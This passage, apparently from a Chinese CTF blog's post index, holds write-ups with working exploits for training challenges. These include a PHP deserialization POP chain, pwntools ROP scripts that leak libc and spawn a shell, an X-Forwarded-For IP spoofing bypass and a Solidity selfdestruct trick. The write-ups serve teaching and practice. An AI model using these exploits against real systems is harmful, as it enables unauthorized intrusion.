$this-&gt;p; return $function(); }}if(isset($_GET['hello'])){ unserialize($_GET['hello']);//[START]}else{ $show = new Show('pop3.php'); $show-&gt;_show();} 我标注了target的两处便是最终要利用的函数，start的一处就是我们可控输入点。 先逆推考察Target 1 如何到达最后的file_get_content(可控)？需要到达file_get(可控)，需要__invoke()且$var可控。如何调用invoke？需要把对象当做函数调用。于是我们就要寻找办法做到这一点： 1... 把一个Read()的对象作为函数调用且可控$var -&gt; __invoke() 且可控$var -&gt; file_get(可控) -&gt; file_get_content(可控)【Finish】 哪里可以函数调用对象？当然是Test-&gt;__get()。__get()可用于从不存在的属性读取数据，那么哪里可以调用get？不太好找了。我们先放一放 再从start顺推考察。unserialize()会调用__wakeup方法，且类一切参数可控。而Show-&gt;__wakeup()中的preg_match会调用类的toString，Show类中恰有toString。跟进方法，发现它想要获得类的属性，那就有可能出现属性不存在的问题。这个过程如下 1【Start】-&gt;unserialize(对象属性全可控) -&gt; Show的wakeup()且source可控 -&gt; Show的source的toString且source可控 -&gt; Show的source的str['str']的__get()方法 -&gt; ... 至此，我们发现前后已经连接上了。 1【Start】-&gt;unserialize() -&gt; Show的wakeup() -&gt; Show的source的toString -&gt; Show的source的str['str']的__get() -&gt; 函数调用了Read()的一个对象 -&gt;Read的__invoke() -&gt; file_get() -&gt; file_get_content()【Finish】 那么就可以构造POP链： 12345678910111213141516171819202122232425&lt;?php class Show{ public $source; public $str;}class Test{ public $p;}class Read{ public $var = \"flag.php\";}$s = new Show();$t = new Test();$r = new Read();$t-&gt;p = $r;$s-&gt;str[\"str\"] = $t;$s-&gt;source = $s;var_dump(serialize($s)); ?&gt;","link":"/2020/03/18/pop%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"title":"Easy_ROP points","text":"作者：LordRiot 2月份美赛的不爽经历搞得人很不想学数学建模，于是最近开始复习pwn，这篇文章大概总结一下这一周复习的ROP中一些小point: ) 这篇中出现的题均是ichunqiu中Linux Pwn基础ROP中的题目，题目中的exp可能有些libc环境问题， 具体地址数值不能直接代入，但思路均可参考:-(其实是我本地莫名加载不了题给libc 2333) TU CTF 2016-especially good jmps这个题一开始有些困扰我的点在于scanf读入数字之后没有清空缓冲区，如果直接sendline(‘1’)这样，那么缓冲区的’\\n’就会将下个gets截断，于是想到在’1’后面加一个字母来截断scanf对整数的读取，相当于payload开头的第一个字符之后的padding记得相应少一个字符即可，exp如下 1234567891011121314151617181920212223242526272829303132333435p = process('especially_good_jmps')puts_got = 0x0804A018puts_plt = 0x080483E0main_addr = 0x08048420sh_addr = 0x08048293payload = &quot;\\x00&quot; * 0x2Cpayload += p32(puts_plt)payload += p32(main_addr)payload += p32(puts_got)p.recvuntil('name?\\n')p.sendline(payload)p.recvuntil('number?\\n')p.send('1l') #cut off the scanf() readingp.recvuntil('odd number!\\n')puts_addr = u32(p.recv(4))print(hex(puts_addr))obj = LibcSearcher(&quot;puts&quot;, puts_addr)base_addr = puts_addr - obj.dump(&quot;puts&quot;)sys_addr = base_addr + obj.dump(&quot;system&quot;)payload = &quot;a&quot; * 0x2b #because of the 'l' hence here is 0x2c - 1 = 0x2bpayload += p32(sys_addr)payload += p32(main_addr)payload += p32(sh_addr)p.recvuntil('name?\\n')p.sendline(payload)p.recvuntil('number?\\n')p.sendline('1')p.interactive() Alictf 2016-vssemmmmmm，算是我做过的第一个静态编译的题，一开始放到IDA里我直接懵了，800多个函数，我还以为是个逆向题，后来查了点相关资料，才知道是个静态编译题，即将libc中的函数直接放到程序里。然后就是函数认证的问题，因为反汇编是一堆sub_xxxxx，emmmmm一个一个看还是比较费劲的，需要从给IDA引入libc.sig文件，将sig数据库的sig文件导入IDA下的”/lscan/lscan/i386/sig”，然后在IDA中使用shift + F5即可应用，但是匹配度有多有少，这个题我最终用三个sig文件匹配到了400多个函数，我试了用github上一个lscan的工具，但是并不好用，匹配率4000+%就离谱，所以目前可能还是只能自己手动添加，不过有一些主要函数大致就够了，这题本身主要是利用抬栈执行ropchain即可，具体原理其实自己想下函数调用很好明白。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091p = process('vss')add_rsp = 0x46f2f1payload = 'py'payload = payload.ljust(0x48, 'a')payload += p64(add_rsp)payload = payload.ljust(0x78, 'a') #to get the rop addr# the ropchain from ROPgadget:payload += pack('&lt;Q', 0x0000000000401937) # pop rsi ; retpayload += pack('&lt;Q', 0x00000000006c4080) # @ .datapayload += pack('&lt;Q', 0x000000000046f208) # pop rax ; retpayload += '/bin//sh'payload += pack('&lt;Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; retpayload += pack('&lt;Q', 0x0000000000401937) # pop rsi ; retpayload += pack('&lt;Q', 0x00000000006c4088) # @ .data + 8payload += pack('&lt;Q', 0x000000000041bd1f) # xor rax, rax ; retpayload += pack('&lt;Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; retpayload += pack('&lt;Q', 0x0000000000401823) # pop rdi ; retpayload += pack('&lt;Q', 0x00000000006c4080) # @ .datapayload += pack('&lt;Q', 0x0000000000401937) # pop rsi ; retpayload += pack('&lt;Q', 0x00000000006c4088) # @ .data + 8payload += pack('&lt;Q', 0x000000000043ae05) # pop rdx ; retpayload += pack('&lt;Q', 0x00000000006c4088) # @ .data + 8payload += pack('&lt;Q', 0x000000000041bd1f) # xor rax, rax ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x000000000045e790) # add rax, 1 ; retpayload += pack('&lt;Q', 0x00000000004004b8) # syscallp.recvuntil('Password')p.sendline(payload)p.interactive() BackdoorCTF 2017-just do it这个题我也是遇到了和之前especially_good_jmps一样的困扰，缓冲区没有清空，无法利用read函数将’sh’读到指定data段，后来想到再leak出地址后可以利用fflsh函数清空一次缓冲区，然后再读入’sh’即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859p = process('32_chal')pop_esi = 0x0804853dmain_addr = 0x0804847Dgot = 0x0804A00Cwrite_plt = 0x08048370data_addr = 0x0804A020read_plt = 0x08048330payload = 'a' * 0x70payload += p32(write_plt)payload += p32(main_addr)payload += p32(1)payload += p32(got)payload += p32(4)p.recvuntil('Hello pwners, \\n')p.sendline(payload)function = 'read'da = u32(p.recvuntil('H')[1:5])addr = dabase_addr = addr - libc32.sym[function]sys_addr = base_addr + libc32.sym['system']gets_addr = base_addr + libc32.sym['gets']fflush_addr = base_addr + libc32.sym['fflush']print(hex(base_addr))print(hex(sys_addr))payload = 'a' * 0x68payload += p32(fflush_addr) #use the fflush to make the read function workspayload += p32(main_addr)payload += p32(0)p.recvuntil('pwners, \\n')p.sendline(payload)payload = 'a' * 0x70payload += p32(read_plt)payload += p32(main_addr)payload += p32(0)payload += p32(data_addr)payload += p32(5)p.recvuntil('pwners, \\n')p.sendline(payload)sleep(1)p.sendline('sh')payload = 'a' * 0x68payload += p32(sys_addr)payload += p32(main_addr)payload += p32(data_addr)p.recvuntil('pwners, \\n')p.sendline(payload)p.interactive() boston key party 2016-simple calc这题其实本身挺简单，也是个静态编译，不过输入需要判断，简单写个判断函数就行，只是一开始懒得自己码代码，想去看看别的dalao怎么做，结果看有的exp一个一个字节手动构造，给我看傻了，遂还是自己写了2333，注意四个字节一个数字，分情况用加，减，乘三种拆分即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127p = process('simple_calc')def SEND(number, A1, A2): p.recvuntil('=&gt; ') p.sendline(str(number)) p.recvuntil('Integer x:') p.sendline(str(A1)) p.recvuntil('Integer y:') p.sendline(str(A2))def get_factor(number): for i in range(40, (int)(math.sqrt(number))): if number % i == 0: return i, number/i return 0, 0payload = '0' * 0x30payload += p64(0) # the parameter of free would be covered by thispayload = payload.ljust(0x48, &quot;\\x00&quot;) # let the program conntinue, use the nullpayload += pack('&lt;Q', 0x0000000000401c87) # pop rsi ; retpayload += pack('&lt;Q', 0x00000000006c1060) # @ .datapayload += pack('&lt;Q', 0x000000000044db34) # pop rax ; retpayload += '/bin//sh'payload += pack('&lt;Q', 0x0000000000470f11) # mov qword ptr [rsi], rax ; retpayload += pack('&lt;Q', 0x0000000000401c87) # pop rsi ; retpayload += pack('&lt;Q', 0x00000000006c1068) # @ .data + 8payload += pack('&lt;Q', 0x000000000041c61f) # xor rax, rax ; retpayload += pack('&lt;Q', 0x0000000000470f11) # mov qword ptr [rsi], rax ; retpayload += pack('&lt;Q', 0x0000000000401b73) # pop rdi ; retpayload += pack('&lt;Q', 0x00000000006c1060) # @ .datapayload += pack('&lt;Q', 0x0000000000401c87) # pop rsi ; retpayload += pack('&lt;Q', 0x00000000006c1068) # @ .data + 8payload += pack('&lt;Q', 0x0000000000437a85) # pop rdx ; retpayload += pack('&lt;Q', 0x00000000006c1068) # @ .data + 8payload += pack('&lt;Q', 0x000000000041c61f) # xor rax, rax ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000400488) # syscalllen = len(payload)p.recvuntil('calculations:')p.sendline(str(len/4 + 1))for i in range(len/4): # make the ropchain works x = u32(payload[i * 4: (i+1) * 4]) if x &gt; 80 and x &lt; 2 ** 31: if x % 2 == 0: a1 = x/2 a2 = x/2 else: a1 = (x+1)/2 a2 = (x-1)/2 SEND(1, a1, a2) elif x &lt; 80: a1 = x + 0x28 a2 = 0x28 SEND(2, a1, a2) else: a1, a2 = get_factor(x) SEND(3, a1, a2)p.recvuntil('=&gt; ')#pause()p.sendline('5')p.interactive() Seccon CTF 2016-cheer msg这个题属实恶心了我好久，一开始找不到洞怎么用，我傻傻的一直没有点开alloca函数，天真的以为那是个库函数，结果后来发现这就是个sub esp, eax， 然后就想到了用负数来让message函数的栈和主函数重合，来溢出，注意的是这里的canary就是个摆设，只有message函数有，主函数没有。然而这只是恶心的开始，然后我就看着message函数的开始是sub esp, 0x68，就想着本身会抬高0x68，一直用这个数据算，结果怎么都拿不到shell，后来看了别的dalao写的exp，自己好好动调了一下，发现总共会抬升0x70，果然凡事别太自信，不行就动调。。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354p = process('cheer_msg')main_addr = 0x080485CAprintf_plt = 0x08048430printf_got = 0x0804A010format_addr = 0x08048888data_addr = 0x0804A030length = -0x70 # the real offset should debug by yourselfp.recvuntil('Length &gt;&gt; ')p.sendline(str(length))payload = 'a' * 32payload += p32(printf_plt)payload += p32(main_addr)payload += p32(printf_got)payload += p32(format_addr)p.recvuntil('Name &gt;&gt; ')p.sendline(payload)p.recvuntil('Message :')printf_addr = u32(p.recvuntil('Hello')[2: 6])base_addr = printf_addr - libc32.sym['printf']gets_addr = base_addr + libc32.sym['gets']sys_addr = base_addr + libc32.sym['system']p.recvuntil('Length &gt;&gt; ')p.sendline(str(length))payload = 'a' * 32payload += p32(gets_addr)payload += p32(main_addr)payload += p32(data_addr)p.recvuntil('Name &gt;&gt; ')p.sendline(payload)p.sendline('sh')payload = 'a' * 32payload += p32(sys_addr)payload += p32(main_addr)payload += p32(data_addr)p.recvuntil('Length &gt;&gt; ')p.sendline(str(length))p.recvuntil('Name &gt;&gt; ')p.sendline(payload)p.interactive() 大概就先写这些吧，最近刚开学，课内压力还不大，趁这个机会好好补补pwn，然而估计TSCTF还是会划水2333，保研要紧保研要紧~","link":"/2020/02/20/Easy_ROP%20points/"},{"title":"MRCTF新生赛 2020","text":"Misc不眠之夜这是一个不能透露出题人信息的题目…解法1：手动拼图（逃解法2：写脚本拼图。通过一些方法（比如边缘的对应像素色差取平方和）计算边缘的相似度，对每个图片对象dfs其四周最相似的图片即可，复杂度(n^3)，2000多像素，常数不大，可以跑。在使用PIL拼图的时候注意生成原图长宽二倍的图片，从中间一点开始扩展，可以保证不会越界。或者检测红色像素点位置，据此构造边缘特征也可以，但这样容易出现多个强连通分量的情况，最后还要手动拼（算法dalao请务必把脚本发来看看解法3：gayhub上的gaps工具。谷歌搜索jigsaw solver可以找到这个工具，两秒就跑出来了。注意其参数-size代表了分割成正方形块的边长。显然应该取小拼图的长宽最大公因数100 Unravel首先拿到后binwalk分离图片发现带有aes的Tokyo然后查看.wav文件尾，发现密文。利用密码解密的得到另一个.wav通过silenteye解LSB隐写得到flag。 飞来横财12345678910111213141516pragma solidity &gt;=0.6.1;contract Modcoin { mapping(uint256 =&gt; bool) public is_successful; function recvpay() public payable { require(((msg.value / 0.001 ether ) % 2 == 0 &amp;&amp; ((msg.value % 0.001 ether) == 0)), &quot;Not Accepting These Coins.&quot;); } function getflag(uint256 target) public { require((address(this).balance / 0.001 ether ) % 2 == 1,&quot;Not Wanted value&quot;); require(msg.sender.send(address(this).balance)); is_successful[target] = true; } fallback () external payable { require(((msg.value / 0.001 ether ) % 2 == 0 &amp;&amp; ((msg.value % 0.001 ether) == 0)), &quot;Not Accepting These Coins.&quot;); }} 原合约中两个支付函数recvpay() 和 fallback() 都只允许接受偶数倍0.001 ether的付款，而合约的getflag函数则要求奇数倍 0.001 ether 的合约余额才可以执行（并清空合约余额），这时就需要绕过限制向合约地址发送ether，而合约自毁或挖矿产生的ether是无法拒绝的，可以通过以下自毁合约达到条件。 12345contract Payassist { function destroy_pay(address payable addr) public payable { selfdestruct(addr); }} pyflag题目灵感：出题人感觉Misc很多题目有着相同的套路，想要尝试基于特征的隐写自动解决工具…于是就有了题目的最后一部分 拿到题目解压缩后发现三张图片。无论是使用strings命令，还是用16进制编辑器打开图片，都可以发现文件末尾隐藏了一些信息。strings会发现[Secret File Part 1-3]的标识，而16进制打开则发现文件尾的结束符并非jpg的标准结束符FF D9。 于是将这三段隐藏信息复制到16进制编辑器中，可以得到一个压缩包。压缩包密码是弱密码1234 然后取得了一个flag.txt，.hint已经提示了使用base16,32,64,85的编码，可以编写自动化脚本来处理，也可以手动尝试。只加密了五层，手动尝试不会很耗费时间。编写py脚本这就需要正则表达式的知识，并掌握这些编码的正则特征。如果你选择编写脚本解码，那么请注意使用的函数传入的参数是str（”Astring”）还是bytes(b”Astring”)。字符流和字节流的区别也很重要，可以去了解一下，明确它们的区别可以让你在数据处理时更加熟练。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env pythonimport base64import redef baseDec(text,type): if type == 1: return base64.b16decode(text) elif type == 2: return base64.b32decode(text) elif type == 3: return base64.b64decode(text) elif type == 4: return base64.b85decode(text) else: passdef detect(text): try: if re.match(\"^[0-9A-F=]+$\",text.decode()) is not None: return 1 except: pass try: if re.match(\"^[A-Z2-7=]+$\",text.decode()) is not None: return 2 except: pass try: if re.match(\"^[A-Za-z0-9+/=]+$\",text.decode()) is not None: return 3 except: pass return 4def autoDec(text): while True: if b\"MRCTF{\" in text: print(\"\\n\"+text.decode()) break code = detect(text) text = baseDec(text,code)with open(\"flag.txt\",'rb') as f: flag = f.read()autoDec(flag) 顺便给出我的加密脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#!/usr/bin/env pythonimport base64import rekey = \"31214\"# key本来非常长。。似乎太难了改的简单了点# key = \"14332234124133132214311231\"flag = b\"MRCTF{Y0u_Are_4_p3rFect_dec0der}\"def baseEnc(text,type): if type == 1: return base64.b16encode(text) elif type == 2: return base64.b32encode(text) elif type == 3: return base64.b64encode(text) elif type == 4: return base64.b85encode(text) else: passdef baseDec(text,type): if type == 1: return base64.b16decode(text) elif type == 2: return base64.b32decode(text) elif type == 3: return base64.b64decode(text) elif type == 4: return base64.b85decode(text) else: passdef finalEnc(text,key): nf = text count = 1 for i in key: nf = baseEnc(nf,int(i,10)) #print(\"第\"+str(count)+\"次加密: \",nf) count +=1 return nfdef finalDec(text,key): nf = text key = key[::-1] print(key) count = 1 for i in key: nf = baseDec(nf,int(i,10)) #print(\"第\"+str(count)+\"次解密: \",nf) count +=1 return nfdef detect(text): try: if re.match(\"^[0-9A-F=]+$\",text.decode()) is not None: return 1 except: pass try: if re.match(\"^[A-Z2-7=]+$\",text.decode()) is not None: return 2 except: pass try: if re.match(\"^[A-Za-z0-9+/=]+$\",text.decode()) is not None: return 3 except: pass return 4def autoDec(text): print(\"dec key:\",end=\"\") while True: if b\"MRCTF{\" in text: print(\"\\n\"+text.decode()) break code = detect(text) text = baseDec(text,code) print(str(code),end=\"\")fe = finalEnc(flag,key)with open(\"flag.txt\",'w') as f: f.write(fe.decode())'''ff = finalDec(fe,key)print(ff)'''ff = autoDec(fe) 最后flag就是MRCTF{Y0u_Are_4_p3rFect_dec0der} cyberpunk!签到题。改时间或者逆向都行。但是昂哥加了个壳估计大家都会去改时间吧23333。 千层套路 Write Up主要考察python脚本编写能力 虽然是千层套娃但是为了不那么毒瘤其实只有两层 第一层，自动化解压zip 试几次就知道zip的解压密码都是对应名字，可以写脚本 123456789101112131415161718192021#coding=utf-8import osimport zipfileorginal_zip = \"0573.zip\"while True: tag = orginal_zip orginal_zip = zipfile.ZipFile(orginal_zip) for contents in orginal_zip.namelist(): password = contents[0:contents.find('.')] print password orginal_zip.setpassword(tag[:-4]) try: orginal_zip.extractall() except: break if(len(tag)&gt;6): os.system(\"rm \"+tag) orginal_zip=password+\".zip\" 因为博客里有写过相应脚本，这里改了下，解压密码都是对应名字而不是压缩包里名字。有个可能的坑是如果不判断的话，程序跑完会自动把qr.zip也删了 然后第二层就是qr.txt 里面一堆 12345678(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)... 显然是像素点 用PIL库搞下 12345678910111213141516171819#coding=utf-8from PIL import Imagex = 200 #x坐标 通过对txt里的行数进行整数分y = 200 #y坐标 x * y = 行数im = Image.new(\"RGB\", (x, y))file = open('qr.txt')for i in range(0, x): for j in range(0, y): line = file.readline() #获取一行的rgb值 line = line[:-2] line = line[1:] print line rgb = line.split(\", \") #分离rgb，文本中逗号后面有空格 im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))im.save('flag.png') 拿到二维码，扫一下拿到flag 1flag=&quot;MRCTF{ta01uyout1nreet1n0usandtimes}&quot; ezmisc下载附件得到一张png图片，在windows下能打开看到，拖进kali中会显示CRC error，由此可以推断 图片的宽度/高度有问题，又因为图片宽度有问题时在windows下无法正常打开图片，所以本题为图片 高度有问题，修改图片高度即可看到flag：MRCTF{1ts_vEryyyyyy_ez!} 附上有关CRC错误的隐写分析网址：https://www.bbsmax.com/A/gVdnlMVXJW/ ctfwiki中也有很详细的介绍：https://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/ 你能看懂音符吗下载附件，解压时报错，放进winhex查看，发现rar文件头错误，将6152修改为5261后再解压，即 可得到一个word文档，打开后发现内容被隐藏，搜索word隐写可知其隐写方式，将被隐藏的内容显 示出来，得到一串音符，在线网址解密音符即可得到flag word隐写方式（供参考）：https://blog.csdn.net/q_l_s/article/details/53813971 解密网址：https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue flag：MRCTF{thEse_n0tes_ArE_am@zing~} WebPYWebsite一道简单的前端trick题目，希望更多人注意到前端验证是不安全的。 首先过一遍业务逻辑，是购买授权码，再验证授权码的过程。自然想到审计验证过程的漏洞。点击按钮弹出窗口是js控制的，进而猜测验证逻辑处于前端，于是查看源代码发现逻辑如下: 不知道MD5？事实上我们根本不需要理会前端的验证，只需要直接跳转到flag.php即可。（md5(“ARandomString”)） 进入flag.php，题目告诉我们只有特定的IP才能访问，并且是后端验证。事实上，应用层使用XFF验证IP也是没有意义的。PHP使用X-Forward-For这个http的请求头来验证，而这个请求头我们可以伪造。 我们不知道购买者的IP，但是知道“自己”的IP，也就是本地环回地址127.0.0.1。因此只需要用抓包软件抓到HTTP的请求包，进行修改（加入X-Forwarded-For: 127.0.0.1一行）就可以欺骗过验证逻辑。最后的flag字体我调成了白色hhh 所以要多观察源代码后端的验证逻辑一般如下： 123456789function checkXFF() { if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; if (strpos($ip, \"127.0.0.1\") !== false) { return true; } } return false;} 顺便一提，如何验证用户的真实IP呢？确实不好办。因为用户可能使用代理（称为正向代理），我们的服务器因为业务需求，也会进行负载均衡等转发操作（称为反向代理）。但如果这个过程没有经过代理，一般使用Remote_Addr是可以获得真实IP的。flag:MRCTF{Ba1_Pia0_Flag_1s_ve7y_H4PPY!} Ez_bypass很简单的bypass第一步md5好多种绕过方法。可以当数组，可以当md5碰撞，可以构造0e开头科学计数法。第二步用语句绕过1234567|1=1即可得到flag比较简单 EzPop主要考察对php魔术化方法的了解 提示里有参考资料，也是为了锻炼赛场上的自学能力吧 考点就这三个 反序列化魔术方法123456789__construct()//当一个对象创建时被调用__destruct() //当一个对象销毁时被调用__toString() //当一个对象被当作一个字符串使用__sleep()//在对象在被序列化之前运行__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)__get()//获得一个类的成员变量时调用__set()//设置一个类的成员变量时调用__invoke()//调用函数的方式调用一个对象时的回应方法__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数 public、protected与private在序列化时的区别protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\\0\\0的前缀。这里的 \\0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \\0 